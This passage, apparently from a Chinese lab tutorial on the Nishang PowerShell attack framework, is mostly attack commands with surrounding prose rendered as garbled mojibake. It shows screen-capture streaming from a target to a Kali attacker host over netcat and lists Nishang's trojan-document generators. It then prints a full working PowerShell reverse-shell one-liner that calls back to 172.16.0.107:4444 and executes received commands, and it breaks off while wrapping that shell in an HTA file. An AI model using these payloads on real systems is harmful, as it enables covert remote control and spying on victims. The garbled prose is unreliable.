&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Show-TargetScreen&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Reverse&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-IPAddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;107&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3333&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;172.16.0.107æ˜¯kaliçš„IPï¼Œæ„æ€å°±æ˜¯æŠŠæœ¬æœºçš„å±å¹•æ•°æ®å‘é€åˆ°172.16.0.107çš„333ç«¯å£ä¸Š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨Kaliæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcat -nlvp &lt;span class=&#34;m&#34;&gt;3333&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; netcat -nlvp &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;æ„æ€å°±æ˜¯æŠŠ3333ç«¯å£çš„æ•°æ®è½¬å‘åˆ°æœ¬åœ°çš„9999ç«¯å£&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥åœ¨æµè§ˆå™¨è¾“å…¥127.0.0.1:9999çœ‹åˆ°å®æ—¶çš„å±å¹•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//22.png&#34; alt=&#34;22&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;æ­£å‘è¿æ¥&lt;/p&gt;
&lt;p&gt;ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Show-TargetScreen&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Bind&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3333&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹       åœ¨Kaliä¸Šæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcat -nv 172.16.0.106 &lt;span class=&#34;m&#34;&gt;3333&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; netcat -lnvp &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;106æ˜¯ç›®æ ‡ä¸»æœºçš„IP&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç»“æœè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œåœ¨Kaliæµè§ˆå™¨è¾“å…¥127.0.0.1:9999çœ‹åˆ°å®æ—¶çš„å±å¹•ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç”Ÿæˆæœ¨é©¬&#34;&gt;ç”Ÿæˆæœ¨é©¬&lt;/h3&gt;
&lt;p&gt;Nishangå¯ä»¥ç”Ÿæˆå„å¼å„æ ·çš„å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨&lt;code&gt;client&lt;/code&gt;ç›®å½•ä¸‹çœ‹åˆ°æœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;dir
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Mode&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;LastWriteTime&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;Length&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;-------------&lt;/span&gt;         &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;19502&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-CHM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;19112&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-Excel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;5265&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-HTA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;7077&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-Java&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;2910&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-JS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;1692&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-SCF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;3517&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-SCT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;4336&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-Shortcut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;3183&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-WebQuery&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;17660&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-Word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å› ä¸ºæˆ‘æµ‹è¯•ç¯å¢ƒçš„ç›®æ ‡ä¸»æœºæ²¡æœ‰å®‰è£…Officeï¼Œæ‰€ä»¥é‡‡ç”¨HTAçš„æ–¹å¼è¿›è¡Œæµ‹è¯•,æˆ‘ä»¬å…ˆæ‰¾ä¸€ä¸ªshellçš„ä»£ç ï¼Œåœ¨&lt;code&gt;shells&lt;/code&gt;ç›®å½•ä¸‹çš„&lt;code&gt;Invoke-PowerShellTcpOneLine.ps1&lt;/code&gt;æ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€è¡Œä»£ç ,ä¿®æ”¹ç«¯å£å’ŒIPååˆ é™¤å…¶ä»–è¡Œçš„å†…å®¹åä¿å­˜æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;$client&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Sockets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;TCPClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;172.16.0.107&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;4444&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stream&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;GetStream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;byte[]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$bytes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;.65535&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|%{&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-ne&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-TypeName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ASCIIEncoding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;GetString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sendback&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;iex &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-String&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sendback2&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$sendback&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;PS &amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sendbyte&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;text.encoding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ASCII&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;GetBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sendback2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sendbyte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sendbyte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Flush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()};&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨Kaliæ‰§è¡Œç›‘å¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ nc -lnvp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååœ¨Windows ä¸»æœºæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Out-HTA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-HTA&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PayloadScript&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-PowerShellTcpOneLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt; 